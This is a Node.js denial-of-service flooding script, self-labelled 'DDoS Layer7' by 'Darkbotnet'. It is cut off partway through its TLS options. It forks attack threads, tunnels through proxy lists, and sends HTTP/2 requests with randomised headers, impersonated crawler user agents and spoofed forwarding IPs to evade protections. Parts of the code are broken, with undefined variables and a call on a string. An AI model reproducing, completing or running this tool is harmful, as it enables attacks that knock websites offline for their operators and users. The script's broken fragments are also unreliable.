const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
var path = require("path");
const crypto = require("crypto");
const UserAgent = require('user-agents');
const fs = require("fs");
const axios = require('axios');
const https = require('https');

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {
});

if (process.argv.length < 7){console.log(`
DDoS Layer7 Development Method By Darkbotnet
`); process.exit();}
const headers = {};
 function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

const getCurrentTime = () => {
   const now = new Date();
   const hours = now.getHours().toString().padStart(2, '0');
   const minutes = now.getMinutes().toString().padStart(2, '0');
   const seconds = now.getSeconds().toString().padStart(2, '0');
   return `(\x1b[34m${hours}:${minutes}:${seconds}\x1b[0m)`;
 };

 const targetURL = process.argv[2];
 const agent = new https.Agent({ rejectUnauthorized: false });

 function getStatus() {
 const timeoutPromise = new Promise((resolve, reject) => {
   setTimeout(() => {
     reject(new Error('Request Timed Out'));
   }, 5000);
 });

 const axiosPromise = axios.get(targetURL, { httpsAgent: agent });

 Promise.race([axiosPromise, timeoutPromise])
   .then((response) => {
     const { status, data } = response;
     console.log(`[\x1b[35mDarkBotnet\x1b[0m] ${getCurrentTime()} Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
   })
   .catch((error) => {
     if (error.message === 'Request Timed Out') {
       console.log(`[\x1b[35mDarkBotnet\x1b[0m] ${getCurrentTime()} Request Timed Out`);
     } else if (error.response) {
       const extractedTitle = getTitleFromHTML(error.response.data);
       console.log(`[\x1b[35mDarkBotnet\x1b[0m] ${getCurrentTime()} Title: ${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);
     } else {
       console.log(`[\x1b[35mDarkBotnet\x1b[0m] ${getCurrentTime()} ${error.message}`);
     }
   });
}


function getTitleFromHTML(html) {
  const titleRegex = /<title>(.*?)<\/title>/i;
  const match = html.match(titleRegex);
  if (match && match[1]) {
    return match[1];
  }
  return 'Not Found';
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function getRandomNumberBetween(min,max){
    return Math.floor(Math.random()*(max-min+1)+min);
}

function randomString(length) {
  var result = "";
  var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  var charactersLength = characters.length;
  for (var i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  ;
  return result;
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
} 


const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
}


if (cluster.isMaster){
 console.clear();
 console.log(`
[+]======DDoS Attack Has Started======[+]
=====Press Ctrl+Z To Stop DDoS=====[+]
`);
 
 for (let i = 1; i <= process.argv[5]; i++){
   cluster.fork();
   console.log(`[\x1b[35mDarkBotnet\x1b[0m] ${getCurrentTime()} Attack Thread ${i} Started`);
 }
 console.log(`[\x1b[35mDarkBotnet\x1b[0m] ${getCurrentTime()} The Attack Has Started`);
 setInterval(getStatus, 2000);
 setTimeout(() => {
   console.log(`[\x1b[35mDarkBotnet\x1b[0m] ${getCurrentTime()} The Attack Is Over`);
   process.exit(1);
 }, process.argv[3] * 1000);
} 

const cplist = [
  'TLS_AES_256_GCM_SHA384',
  'TLS_CHACHA20_POLY1305_SHA256',
  'TLS_AES_128_GCM_SHA256',
  'ECDHE-RSA-AES128-GCM-SHA256',
  'ECDHE-ECDSA-AES128-GCM-SHA256',
  'ECDHE-RSA-AES256-GCM-SHA384',
  'ECDHE-ECDSA-AES256-GCM-SHA384',
  'ECDHE-RSA-AES128-SHA256',
  'ECDHE-RSA-AES256-SHA384',
  'DHE-RSA-AES128-GCM-SHA256',
  'DHE-RSA-AES256-GCM-SHA384'
];

const coepValues = ["require-corp", "unsafe-none"];

const sigalgs = [
  'ecdsa_secp256r1_sha256',  // TLS 1.3 most preferred and strongest
  'ecdsa_secp384r1_sha384',
  'ecdsa_secp521r1_sha512',
  'rsa_pss_rsae_sha256',
  'rsa_pss_rsae_sha384',
  'rsa_pss_rsae_sha512',
  'rsa_pkcs1_sha256',  // TLS 1.2 secure fallback options
  'rsa_pkcs1_sha384',
  'rsa_pkcs1_sha512',
  'ed25519',
  'ed448',
  'rsa_pkcs1_sha1',  // Compatibility if needed (legacy)
  'ecdsa_sha1',      // Compatibility if needed (legacy)
];




const langHeader = [
  'en-US,en;q=0.9', 'en-GB,en;q=0.8', 'en-AU,en;q=0.7', 'en-CA,en;q=0.7', 'en-NZ,en;q=0.6', 'en-IN,en;q=0.5',
  'ko-KR', 'ja-JP', 'zh-CN,zh;q=0.9', 'zh-TW,zh;q=0.9', 'zh-HK,zh;q=0.8,en-US;q=0.5',
  'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7', 'fr-CH,fr;q=0.9,en;q=0.8,de;q=0.7,*;q=0.5',
  'de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7', 'de-AT,de-DE;q=0.9,en;q=0.5', 'tr-TR,tr;q=0.9,en-US;q=0.8',
  'vi-VN,vi;q=0.9,en-US;q=0.6', 'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7', 'cs-CZ,cs;q=0.8,en;q=0.6',
  'da-DK,da;q=0.9,en-GB;q=0.8,en;q=0.7', 'en-SG', 'en-PH', 'en-HK', '*',
  'utf-8,iso-8859-1;q=0.5,*;q=0.1',
  
  // Adding more country languages:
  'ar-SA,ar;q=0.9,en;q=0.8', 'es-ES,es;q=0.9,en;q=0.8', 'pt-PT,pt;q=0.9,en;q=0.8',
  'it-IT,it;q=0.9,en;q=0.7', 'nl-NL,nl;q=0.9,en;q=0.7', 'pl-PL,pl;q=0.9,en;q=0.7',
  'sv-SE,sv;q=0.9,en;q=0.7', 'fi-FI,fi;q=0.9,en;q=0.7', 'no-NO,no;q=0.9,en;q=0.7',
  'ru-RU,ru;q=0.9,en;q=0.7', 'bg-BG,bg;q=0.9,en;q=0.7', 'hr-HR,hr;q=0.9,en;q=0.7',
  'sk-SK,sk;q=0.9,en;q=0.7', 'ro-RO,ro;q=0.9,en;q=0.7', 'sr-RS,sr;q=0.9,en;q=0.7',
  'hu-HU,hu;q=0.9,en;q=0.7', 'th-TH,th;q=0.9,en;q=0.7', 'id-ID,id;q=0.9,en;q=0.7',
  'ms-MY,ms;q=0.9,en;q=0.7', 'ta-IN,ta;q=0.9,en;q=0.7', 'ml-IN,ml;q=0.9,en;q=0.7',
  'gu-IN,gu;q=0.9,en;q=0.7', 'kn-IN,kn;q=0.9,en;q=0.7', 'mr-IN,mr;q=0.9,en;q=0.7',
  'te-IN,te;q=0.9,en;q=0.7', 'pa-IN,pa;q=0.9,en;q=0.7', 'bn-IN,bn;q=0.9,en;q=0.7',
  'tr-TR,tr;q=0.9,en;q=0.8', 'fa-IR,fa;q=0.9,en;q=0.8', 'iw-IL,iw;q=0.9,en;q=0.8',
  'zh-SG,zh;q=0.9,en;q=0.8', 'en-GB,en;q=0.9', 'en-IE,en;q=0.9', 'en-NZ,en;q=0.8'
];



const acceptHeader = [
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'application/json, text/plain, */*',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
  'application/json',
  'text/html; charset=utf-8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
  
  // New additions:
  'image/png,image/jpeg,image/webp,*/*;q=0.8',
  'application/javascript,*/*;q=0.9',
  'application/x-javascript,*/*;q=0.8',
  'application/octet-stream,*/*;q=0.7',
  'application/pdf,*/*;q=0.7',
  'application/vnd.ms-excel,*/*;q=0.7',
  'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,*/*;q=0.7',
  'application/vnd.ms-powerpoint,*/*;q=0.7',
  'application/vnd.openxmlformats-officedocument.presentationml.presentation,*/*;q=0.7',
  'application/zip,*/*;q=0.6',
  'audio/mpeg,*/*;q=0.7',
  'audio/wav,*/*;q=0.6',
  'video/mp4,*/*;q=0.8',
  'video/webm,*/*;q=0.7'
];


const controleHeader = [
  'no-cache',                    // Prevents caching at the browser level
  'no-store',                    // Don't store any part of the request or response
  'no-transform',                // Prevents transforming content (like image resizing/compression)
  'only-if-cached',              // Only serve cached content, no re-fetching from the server
  'max-age=0',                   // Forces revalidation of the cache (content expires immediately)
  'must-revalidate',             // Ensures cached content is revalidated before serving
  'public',                      // Allows public caching by any cache (e.g., CDN)
  'private',                     // Content is user-specific, should not be cached publicly (no CDN)
  'proxy-revalidate',            // Instructs proxy servers to revalidate the cache before serving
  's-maxage=86400',              // Cache content for 1 day in shared caches (like CDN)
  'immutable',                   // Content never changes, can be cached forever (good for static assets)
  'max-age=31536000',            // Cache content for 1 year (commonly used for static assets like images)
  'stale-while-revalidate=60',   // Serve stale content for 60 seconds while checking for newer content
  'stale-if-error=86400',        // Serve stale content for 1 day if there's an error in fetching new content
  'cache-control: max-age=0, no-store, no-cache, must-revalidate', // More explicit control for cache expiration
  'pragma: no-cache',            // Prevent caching at older browsers (useful for legacy compatibility)
  'expires: 0',                  // Set expiration date to past, ensuring the content is considered expired immediately
  
  // Additional headers for improved caching and performance control
  'cache-control: public, max-age=3600',         // Cache for 1 hour in public caches
  'cache-control: private, max-age=86400',       // Cache for 1 day in private (user-specific) cache
  'cache-control: no-cache, no-store',           // Prevent cache storage completely
  'cache-control: must-revalidate',              // Revalidate before serving from cache
  'content-security-policy: default-src: https:', // Security header to restrict content loading from trusted sources
  'content-security-policy: script-src: https://trusted.com', // Specific allowed sources for scripts
  'x-frame-options: DENY',                      // Prevent the page from being embedded in frames
  'x-content-type-options: nosniff',             // Prevent browser from interpreting files as a different MIME type
  'x-xss-protection: 1; mode=block',             // Enable XSS filtering in browsers
  'strict-transport-security: max-age=31536000; includeSubDomains', // Enforce HTTPS for 1 year
  'referrer-policy: no-referrer-when-downgrade', // Control how much referrer information is sent
];



const encodingHeader = [
  '*',                                // Accept any encoding
  '*/*',                              // Accept any encoding (wildcard)
  'gzip',                             // Gzip compression
  'gzip, deflate, br',                // Gzip, Deflate, Brotli (modern and efficient)
  'compress, gzip',                   // Compress with gzip as a fallback
  'deflate, gzip',                    // Deflate first, then gzip
  'gzip, identity',                   // Gzip with no encoding (identity) fallback
  'gzip, deflate',                    // Gzip with deflate as fallback
  'br',                               // Brotli (preferred compression for modern browsers)
  'br;q=1.0, gzip;q=0.8, *;q=0.1',     // Prioritize Brotli, then gzip, then any
  'gzip;q=1.0, identity;q=0.5, *;q=0', // Gzip first, then identity
  'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25', // Prioritize Brotli, then Gzip
  'compress;q=0.5, gzip;q=1.0',        // Compress or gzip
  'identity',                         // No encoding (raw data)
  'gzip, compress',                   // Gzip or Compress
  'compress, deflate',                // Compress or deflate
  'compress',                         // Accept compression
  'gzip, deflate, br',                // Prefer Gzip, then deflate and Brotli
  'deflate',                          // Accept only deflate
  'gzip, deflate, lzma, sdch',        // Older formats: lzma, sdch (specific cases)
  'deflate',                          // Deflate only
  'x-compress',                       // Specific case of x-compress
  'x-gzip',                           // Specific case of x-gzip
  'gzip;q=0.8, deflate;q=0.7',         // Prioritize Gzip and then Deflate
  'gzip, deflate;q=0.9, br;q=0.8',    // Gzip and Deflate, then Brotli
  'gzip, deflate;q=0.9, identity;q=0.6', // Gzip, Deflate first, then identity
  'gzip;q=0.9, br;q=0.8, deflate;q=0.7', // Gzip and Brotli prioritized over deflate
  'deflate;q=0.8, br;q=0.6, gzip;q=0.5', // Deflate first, then Brotli, then Gzip
  'gzip, br;q=1.0, deflate;q=0.8',      // Prioritize Brotli over Deflate and Gzip
  'br;q=1.0, gzip;q=0.7, deflate;q=0.5', // Brotli first, then Gzip, then Deflate
  'gzip;q=1.0, deflate;q=0.7, br;q=0.5', // Gzip first, then Deflate, then Brotli
  'gzip;q=0.7, deflate;q=0.5, br;q=0.3', // Gzip prioritized, then Deflate, then Brotli
];



const controle_header = [
  'max-age=604800',                               // Cache for 7 days
  'proxy-revalidate',                             // Forces proxy caches to revalidate the cache
  'public, max-age=0',                            // Content is publicly cacheable but expires immediately
  'max-age=315360000',                            // Cache for 10 years (useful for static assets)
  'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800', // Cache for 1 day, stale content served while revalidating
  's-maxage=604800',                              // Cache for 7 days in shared caches (CDN)
  'max-stale',                                    // Allow serving stale content
  'public, immutable, max-age=31536000',          // Cache for 1 year, content never changes (use for versioned static assets)
  'must-revalidate',                              // Content must be revalidated before use
  'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0', // Strict non-caching for private content
  'max-age=31536000, public, immutable',          // Cache for 1 year, content is immutable (good for static files)
  'max-age=31536000, public',                     // Cache for 1 year, public content
  'min-fresh',                                    // The response must be fresh (greater than the specified value)
  'private',                                      // Content is specific to a user, should not be cached publicly
  'public',                                       // Content can be cached by any cache (CDN)
  's-maxage',                                     // Shared cache lifespan control (use with CDN)
  'no-cache',                                     // Forces revalidation before serving cached content
  'no-cache, no-transform',                       // Prevents transformations like image compression
  'max-age=2592000',                              // Cache for 30 days
  'no-store',                                     // Don't store any part of the request or response
  'no-transform',                                 // Don't transform the content (e.g., image resizing)
  'max-age=31557600',                             // Cache for 1 year, adjusted for leap years
  'stale-if-error',                               // Serve stale content in case of an error
  'only-if-cached',                               // Only serve cached content, don't fetch new
  'max-age=0',                                    // Forces revalidation immediately (expires immediately)
  'must-understand, no-store',                    // Ensures the must-understand directive is followed and no storage
  'max-age=31536000; includeSubDomains',          // Cache for 1 year, including subdomains
  'max-age=31536000; includeSubDomains; preload', // Same as above, plus preload for subdomains
  'max-age=120',                                  // Cache for 2 minutes (useful for short-lived content)
  'max-age=0,no-cache,no-store,must-revalidate',  // Forces no cache, revalidation is required
  'public, max-age=604800, immutable',            // Cache for 1 week, content is immutable
  'max-age=0, must-revalidate, private',          // Content expires immediately and must be revalidated
  'max-age=0, private, must-revalidate',          // Private content with immediate expiration and revalidation
  'max-age=604800, stale-while-revalidate=86400', // Cache for 1 week, serve stale for 1 day while revalidating
  'max-stale=3600',                               // Serve stale content for up to 1 hour
  'public, max-age=2678400',                      // Cache for 31 days
  'min-fresh=600',                                // Content must be fresh (greater than 600 seconds)
  'public, max-age=30672000',                     // Cache for 356 days
  'max-age=31536000, immutable',                  // Cache for 1 year, immutable content
  'max-age=604800, stale-if-error=86400',         // Cache for 1 week, serve stale content for 1 day on error
  'public, max-age=604800',                       // Cache for 1 week
  'no-cache, no-store, private, max-age=0, must-revalidate', // Strict non-caching and private content
  'o-cache, no-store, must-revalidate, pre-check=0, post-check=0', // Legacy support for older HTTP/1.0 caches
  'public, s-maxage=600, max-age=60',             // Cache for 10 minutes (shared cache) and 1 minute (browser cache)
  'public, max-age=31536000',                     // Cache for 1 year
  'max-age=14400, public',                        // Cache for 4 hours
  'max-age=14400',                                // Cache for 4 hours
  'max-age=600, private',                         // Cache for 10 minutes for private content
  'public, s-maxage=600, max-age=60',             // Shared cache for 10 minutes, browser cache for 1 minute
  'no-store, no-cache, must-revalidate',          // Strict no-cache directive
  'no-cache, no-store, private, s-maxage=604800, must-revalidate', // Private cache, revalidation required
  'Sec-CH-UA,Sec-CH-UA-Arch,Sec-CH-UA-Bitness,Sec-CH-UA-Full-Version-List,Sec-CH-UA-Mobile,Sec-CH-UA-Model,Sec-CH-UA-Platform,Sec-CH-UA-Platform-Version,Sec-CH-UA-WoW64' // Client hints for more specific user-agent info
];


const Methods = [
  "GET",          // Retrieve data from the server
  "POST",         // Send data to the server (e.g., form submission)
  "PUT",          // Update existing data on the server
  "DELETE",       // Delete data from the server
  "PATCH",        // Partially update data on the server
  "HEAD",         // Retrieve headers from the server (without the body)
  "OPTIONS",      // Get allowed methods for a resource
  "TRACE",        // Perform a diagnostic trace of the path to the server
  "CONNECT"       // Establish a tunnel to the server (typically used for proxies)
];

const randomMethod = Methods[Math.floor(Math.random() * Methods.length)];

const queryStrings = [
  "&",  // Used to separate query parameters
  "=",  // Used to assign values to query parameters
  "#",  // Used to specify a fragment (e.g., anchor in a webpage)
  "?",  // Marks the beginning of the query string in a URL
  "%20",  // Encodes a space character (used in URLs)
  "%2F",  // Encodes a forward slash (/)
  "%3F",  // Encodes a question mark (?)
  "%3D",  // Encodes an equals sign (=)
  "%26",  // Encodes an ampersand (&)
];


const pathts = [
  "/",                             // Home page or root directory
  "?page=1",                       // Page 1 of paginated content
  "?page=2",                       // Page 2 of paginated content
  "?page=3",                       // Page 3 of paginated content
  "?category=news",                // Category filter for 'news'
  "?category=sports",              // Category filter for 'sports'
  "?category=technology",          // Category filter for 'technology'
  "?category=entertainment",       // Category filter for 'entertainment'
  "?sort=newest",                  // Sorting by newest content
  "?filter=popular",               // Filter for popular content
  "?limit=10",                     // Limit the results to 10 items
  "?start_date=1989-06-04",        // Filter content starting from this date
  "?end_date=1989-06-04",          // Filter content ending on this date
  "?search=query",                 // Search query (e.g., search for 'query')
  "?user_id=12345",                // Filter by a specific user ID
  "?tag=technology",               // Filter by specific tag (e.g., 'technology')
  "?lang=en",                      // Filter or specify content in a particular language (e.g., English)
  "?author=JohnDoe",               // Filter content by a specific author
  "?featured=true",                // Filter to show only featured content
  "?rating=5",                     // Filter content with a rating of 5
  "?sort=ascending",               // Sort content in ascending order
  "?sort=descending",              // Sort content in descending order
  "?limit=20",                     // Limit the results to 20 items
  "?page=5&category=sports",       // Pagination combined with category filter
  "?start_date=2020-01-01&end_date=2020-12-31", // Date range filter
  "?search=technology&sort=newest", // Search with sorting
  "?limit=50&sort=ascending",     // Limit and sort together
  "?lang=fr",                      // French language filter
  "?user_id=98765&category=technology", // Filter by user and category
  "?q=game&filter=popular&limit=10" // Search with filter and limit
];


const refers = [
  "https://www.google.com/search?q=",                // Google search
  "https://check-host.net/",                         // Check-host.net for IP and server analysis
  "https://www.facebook.com/",                       // Facebook
  "https://www.youtube.com/",                        // YouTube
  "https://www.fbi.com/",                            // FBI website
  "https://www.bing.com/search?q=",                  // Bing search
  "https://r.search.yahoo.com/",                     // Yahoo search
  "https://www.cia.gov/index.html",                  // CIA website
  "https://vk.com/profile.php?redirect=",            // VK social network
  "https://www.usatoday.com/search/results?q=",      // USA Today search
  "https://help.baidu.com/searchResult?keywords=",  // Baidu help search
  "https://steamcommunity.com/market/search?q=",     // Steam market search
  "https://www.ted.com/search?q=",                   // TED talks search
  "https://play.google.com/store/search?q=",         // Google Play Store search
  "https://www.qwant.com/search?q=",                 // Qwant search
  "https://google.com/",                             // Google home
  "https://duckduckgo.com/?q=",                      // DuckDuckGo search
  "https://yandex.ru/yandsearch?text=",              // Yandex search
  "http://search.aol.com/aol/search?q=",             // AOL search
  "http://www.reddit.com/search?q=",                 // Reddit search
  "http://www.shodanhq.com/search?q=",               // Shodan search
  "http://www.topsiteminecraft.com/site/pinterest.com/search?q=", // Pinterest search (Minecraft)
  "https://developers.google.com/speed/pagespeed/insights/?url=", // Google PageSpeed Insights
  "https://drive.google.com/viewerng/viewer?url=",   // Google Drive viewer
  "http://www.pagescoring.com/website-speed-test/?url=", // PageSpeed test site
  "https://www.amazon.com/s?k=",                     // Amazon search
  "https://www.reddit.com/r/all/search?q=",          // Reddit All search
  "https://www.quora.com/search?q=",                 // Quora search
  "https://www.stackoverflow.com/search?q=",         // Stack Overflow search
  "https://www.pinterest.com/search/pins/?q=",       // Pinterest search
  "https://www.nytimes.com/search",                  // New York Times search
  "https://www.linkedin.com/search/results/all/?keywords=", // LinkedIn search
  "https://www.etsy.com/search?q=",                  // Etsy search
  "https://www.medium.com/search?q=",                // Medium search
  "https://www.github.com/search?q=",                // GitHub search
  "https://www.walmart.com/search/?query=",          // Walmart search
  "https://www.bbc.co.uk/search?q=",                 // BBC search
  "https://www.reuters.com/search/news?blob=",       // Reuters search
  "https://www.imdb.com/find?q="                     // IMDb search
];


var randomReferer = refers[Math.floor(Math.random() * refers.length)];
let concu = sigalgs.join(':');

const uap = [
  'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
  'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)',
  'Mozilla/5.0 (compatible; ChatGPT-User/1.0; +https://openai.com)',
  'Mozilla/5.0 (compatible; PerplexityBot/1.0; +https://www.perplexity.ai/bot)',
  'Mozilla/5.0 (compatible; PingdomBot/2.4; +https://www.pingdom.com/)',
  'Mozilla/5.0 (compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)',
  'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)',
  'Twitterbot/1.0',
  "Mozilla/5.0 (compatible; Google-InspectionTool/1.0;)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.59 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  'Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)',
  'Mozilla/5.0 (compatible; CommonCrawl/2.0; +http://commoncrawl.org/faq/)',
  'Mozilla/5.0 (compatible; archive.org_bot +http://archive.org/details/archive.org_bot)',
  'FeedFetcher-Google; (+http://www.google.com/feedfetcher.html)',
  'Mozilla/5.0 (compatible; Feedly/1.0; +http://www.feedly.com/fetcher.html)',
];



const ip_spoof = () => {
    const ip_segment = () => {
        return Math.floor(Math.random() * 255); // Generates a random number between 0 and 254
    };
    return `${ip_segment()}.${ip_segment()}.${ip_segment()}.${ip_segment()}`; // Returns a fake IP address
};
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
var proxies = readLines(args.proxyFile);
const fakeIP = ip_spoof();
var queryString = queryStrings[Math.floor(Math.random() * queryStrings.length)];
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork(); // Fork a new worker for each thread
    }
} else {
    setInterval(runFlooder); // Workers execute the flooder function periodically
}

// HTTP Proxy and Connection Handling
class NetSocket {
    constructor(){}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 100000);

        connection.on("connect", () => {
            connection.write(buffer); // Send payload to proxy server
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (!isAlive) {
                connection.destroy(); // Disconnect if the proxy response is not valid
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined); // Connection successful
        });

        connection.on("timeout", () => {
            connection.destroy(); // Disconnect if timeout occurs
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy(); // Handle errors
            return callback(undefined, "error: " + error);
        });
    }
}


const Socker = new NetSocket();

headers[":method"] = randomMethod();
headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + "&" + randomString(10) + queryString + randomString(10);
headers["origin"] = "https://" + parsedTarget.host;
headers["content-type"] = randomHeaders['content-type'] || "application/json";
headers[":scheme"] = "https";
headers["x-download-options"] = randomHeaders['x-download-options'] || "noopen";
headers["cross-origin-embedder-policy"] = randomHeaders['cross-origin-embedder-policy'] || "require-corp";
headers["cross-origin-opener-policy"] = randomHeaders['cross-origin-opener-policy'] || "same-origin";
headers["accept"] = "*/*";
headers["accept-language"] = browserProfile.acceptLanguage;
headers["referrer-policy"] = randomHeaders['referrer-policy'] || "strict-origin-when-cross-origin";
headers["x-cache"] = randomHeaders['x-cache'] || "MISS";
headers["content-security-policy"] = randomHeaders['content-security-policy'] || "default-src 'self'";
headers["accept-encoding"] = "gzip, deflate, br";
headers["cache-control"] = "no-cache";
headers["x-frame-options"] = randomHeaders['x-frame-options'] || "DENY";
headers["x-xss-protection"] = "1; mode=block";
headers["x-content-type-options"] = "nosniff";
headers["te"] = "trailers";
headers["pragma"] = "no-cache";
headers["sec-ch-ua-platform"] = browserProfile.secChUaPlatform;
headers["upgrade-insecure-requests"] = "1";
headers["sec-fetch-dest"] = browserProfile.secFetchDest;
headers["sec-fetch-mode"] = browserProfile.secFetchMode;
headers["sec-fetch-site"] = browserProfile.secFetchSite;
headers["x-forwarded-proto"] = "https";
headers["sec-ch-ua"] = browserProfile.secChUa;
headers["sec-ch-ua-mobile"] = browserProfile.secChUaMobile;
headers["vary"] = randomHeaders['vary'] || "Accept-Encoding";
headers["x-requested-with"] = "XMLHttpRequest";
headers["set-cookie"] = randomHeaders['set-cookie'] || "";
headers["server"] = randomHeaders['server'] || "cloudflare";
headers["strict-transport-security"] = randomHeaders['strict-transport-security'] || "max-age=31536000; includeSubDomains; preload";
headers["access-control-allow-headers"] = "*";
headers["access-control-allow-origin"] = "*";
headers["content-encoding"] = "gzip";
headers["alt-svc"] = randomHeaders['alt-svc'] || "h3=\":443\"; ma=86400";


headers["via"] = fakeIP;
headers["sss"] = fakeIP;
headers["sec-websocket-key"] = randomString(16);
headers["sec-websocket-version"] = "13";
headers["upgrade"] = "websocket";
headers["x-forwarded-for"] = fakeIP;
headers["x-forwarded-host"] = parsedTarget.host;
headers["client-ip"] = fakeIP;
headers["real-ip"] = fakeIP;
headers["referer"] = randomReferer;

headers["x-requested-with"] = "XMLHttpRequest";
headers["user-agent"] = browserProfile.userAgent;
headers["accept"] = "*/*";
headers["cache-control"] = "no-store, no-cache, must-revalidate, max-age=0";
headers["connection"] = "keep-alive";
headers["host"] = parsedTarget.host;
headers["x-real-ip"] = fakeIP;
headers["x-forwarded-proto"] = "https";
headers["sec-fetch-mode"] = browserProfile.secFetchMode;
headers["sec-fetch-site"] = browserProfile.secFetchSite;





function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const userAgentv2 = new UserAgent();
    var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
    headers[":authority"] = parsedTarget.host
    headers["user-agent"] = uap1;

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 25
    };

   setTimeout(function(){
     process.exit(1);
   }, process.argv[3] * 1000);
   
   process.on('uncaughtException', function(er) {
   });
   process.on('unhandledRejection', function(er) {
   });

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return

        connection.setKeepAlive(true, 100000);

        const tlsOptions = {
          ALPNProtocols: ['h2'],               // HTTP/2 support
          challengesToSolve: Infinity,        // custom, depends on your lib
          resolveWithFullResponse: true,      // custom, your lib ka feature lag raha
          followAllRedirects: true,
          maxRedirects: 10,
          clientTimeout: 5000,
          clientMaxTimeout: 10000,             // fixed typo from clientlareMaxTimeout
          cloudflareTimeout: 5000,
          cloudflareMaxTimeout: 30000,
          
          // Cipher suites - best practice: specify modern TLS 1.2/1.3 ciphers only
          ciphers: [
            "TLS_AES_128_GCM_SHA256",         // TLS 1.3
            "TLS_AES_256_GCM_SHA384",
            "TLS_CHACHA20_POLY1305_SHA256",
            "ECDHE-ECDSA-AES128-GCM-SHA256",
            "ECDHE-RSA-AES128-GCM-SHA256",
            "ECDHE-ECDSA-AES256-GCM-SHA384",
            "ECDHE-RSA-AES256-GCM-SHA384",
            "ECDHE-ECDSA-CHACHA20-POLY1305",
            "ECDHE-RSA-CHACHA20-POLY1305"
          ].join(":"),
      
          // secureProtocol takes string, pick one or remove for auto-negotiation (recommended)
          // If you want to force min TLS 1.2:
          minVersion: "TLSv1.2",
          maxVersion: "TLSv1.3",
      
          servername: parsedTarget.host,      // SNI
          socket: connection,                  // your socket instance
          honorCipherOrder: true,
      
          // Secure options (flags) - updated & simplified
          secureOptions:
            crypto.constants.SSL_OP_NO_RENEGOTIATION |
            crypto.constants.SSL_OP_NO_TICKET |
            crypto.constants.SSL_OP_NO_SSLv2 |
            crypto.constants.SSL_OP_NO_SSLv3 |
            crypto.constants.SSL_OP_NO_COMPRESSION,
      
          // Signature algorithms to use (fix typo from sigals to sigalgs)
